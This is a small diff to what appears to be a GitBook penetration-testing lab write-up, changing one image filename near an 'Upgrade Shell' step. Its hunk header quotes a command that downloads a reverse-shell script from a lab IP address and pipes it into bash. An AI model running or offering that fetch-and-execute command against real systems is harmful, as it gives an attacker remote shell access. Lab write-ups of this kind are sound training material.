@@ -116,7 +116,7 @@ curl 192.168.49.90/rev_shell | bash
 
 <figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption><p>Terminator Command Window</p></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (5).png" alt=""><figcaption><p>Terminator Command Window</p></figcaption></figure>
 
 Upgrade Shell:
 
